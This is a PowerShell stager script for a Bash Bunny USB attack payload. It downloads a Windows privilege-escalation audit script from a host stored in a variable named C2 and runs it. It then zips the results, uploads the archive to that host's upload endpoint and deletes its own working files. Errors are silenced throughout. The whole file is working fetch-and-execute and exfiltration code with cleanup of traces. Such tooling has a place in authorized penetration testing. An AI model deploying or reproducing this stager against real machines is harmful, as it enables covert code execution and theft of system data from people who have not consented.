# ================================================================
#  Bash Bunny — privesc-windows-audit / runner.ps1
#  Description : Stager script fetched and executed on the target.
#                Downloads PrivescAudit-Windows.ps1, executes it,
#                zips results, and POSTs the archive to receive.py.
#  Target OS   : Windows (PS 3.0+)
#  Compatibility: PS 3.0+ (.NET 4.5 ZipFile primary, Compress-Archive fallback)
# ================================================================

$ErrorActionPreference = 'SilentlyContinue'
$C2 = 'http://172.16.64.1'
$WorkDir = 'C:\Windows\Temp\pea_privesc'
$AuditScript = "$WorkDir\PrivescAudit-Windows.ps1"
$ResultDir = 'C:\PrivescAudit'
$ZipPath = "$WorkDir\privesc_audit.zip"

# ── Setup ─────────────────────────────────────────────────────────
[void][System.IO.Directory]::CreateDirectory($WorkDir)

# ── Download audit script ─────────────────────────────────────────
try {
    (New-Object Net.WebClient).DownloadFile("$C2/PrivescAudit-Windows.ps1", $AuditScript)
} catch {
    exit 1
}
if (-not (Test-Path $AuditScript)) { exit 1 }

# ── Execute audit ─────────────────────────────────────────────────
try {
    & $AuditScript
} catch { }

# ── Wait for result directory ─────────────────────────────────────
$waited = 0
while (-not (Test-Path $ResultDir) -and $waited -lt 120) {
    Start-Sleep -Seconds 5
    $waited += 5
}
if (-not (Test-Path $ResultDir)) { exit 1 }

# ── Zip results ───────────────────────────────────────────────────
if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }

$zipped = $false
# .NET ZipFile (PS 3.0+ with .NET 4.5)
try {
    Add-Type -Assembly 'System.IO.Compression.FileSystem'
    [IO.Compression.ZipFile]::CreateFromDirectory($ResultDir, $ZipPath)
    $zipped = $true
} catch { }

# Compress-Archive fallback (PS 5.0+)
if (-not $zipped) {
    try {
        Compress-Archive -Path "$ResultDir\*" -DestinationPath $ZipPath -Force
        $zipped = $true
    } catch { }
}

if (-not $zipped -or -not (Test-Path $ZipPath)) { exit 1 }

# ── POST zip to Bunny ─────────────────────────────────────────────
try {
    $wc = New-Object Net.WebClient
    $wc.UploadFile("$C2/upload", $ZipPath)
} catch { }

# ── Cleanup ───────────────────────────────────────────────────────
Remove-Item $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $AuditScript -Force -ErrorAction SilentlyContinue
